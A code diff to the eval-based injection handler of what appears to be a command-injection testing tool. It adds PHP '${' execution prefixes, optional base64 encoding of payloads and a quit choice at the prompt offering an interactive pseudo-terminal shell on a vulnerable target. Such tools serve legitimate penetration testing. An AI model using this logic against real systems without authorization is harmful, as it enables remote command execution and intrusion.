@@ -52,7 +52,11 @@ def eb_injection_handler(url, delay, filename, http_request_method):
   export_injection_info = False
   injection_type = "Results-based Command Injection"
   technique = "eval-based injection technique"
-  
+
+  for item in range(0, len(settings.EXECUTION_FUNCTIONS)):
+    settings.EXECUTION_FUNCTIONS[item] = "${" + settings.EXECUTION_FUNCTIONS[item] + "("
+  settings.EVAL_PREFIXES = settings.EVAL_PREFIXES + settings.EXECUTION_FUNCTIONS
+
   url = eb_injector.warning_detection(url)
 
   sys.stdout.write("(*) Testing the "+ technique + "... ")
@@ -82,15 +86,22 @@ def eb_injection_handler(url, delay, filename, http_request_method):
         try:
           # Eval-based decision payload (check if host is vulnerable).
           payload = eb_payloads.decision(separator, TAG, randv1, randv2)
-          
           suffix = urllib.quote(suffix)
 
           # Fix prefixes / suffixes
           payload = parameters.prefixes(payload, prefix)
           payload = parameters.suffixes(payload, suffix)
-
+          # Fixation for specific payload.
+          if ")%3B" + urllib.quote(")}") in payload:
+            payload = payload.replace(")%3B" + urllib.quote(")}"), ")" + urllib.quote(")}"))
           payload = payload + "" + TAG + ""
-          payload = re.sub(" ", "%20", payload)
+
+          if menu.options.base64:
+            payload = urllib.unquote(payload)
+            payload = base64.b64encode(payload)
+          else:
+            payload = re.sub(" ", "%20", payload)
+
 
           # Check if defined "--verbose" option.
           if menu.options.verbose:
@@ -193,7 +204,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
           print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
           print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
           print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
-            
+
           # Check for any enumeration options.
           eb_enumeration.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter)
 
@@ -209,7 +220,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
           while True:
             if go_back == True:
               break
-            gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
+            gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
             if gotshell in settings.CHOISE_YES:
               print ""
               print "Pseudo-Terminal (type '?' for shell options)"
@@ -220,7 +231,6 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                     if cmd.lower() == "?":
                       menu.shell_options()
                     elif cmd.lower() == "quit":
-                      logs.logs_notification(filename)
                       sys.exit(0)
                     elif cmd.lower() == "back":
                       go_back = True
@@ -229,6 +239,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                       pass
                       
                   else:
+
                     # The main command injection exploitation.
                     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter)
                           
@@ -254,7 +265,10 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                 sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
                 sys.stdout.flush()
               break
-            
+
+            elif gotshell in settings.CHOISE_QUIT:
+              sys.exit(0)
+
             else:
               if gotshell == "":
                 gotshell = "enter"
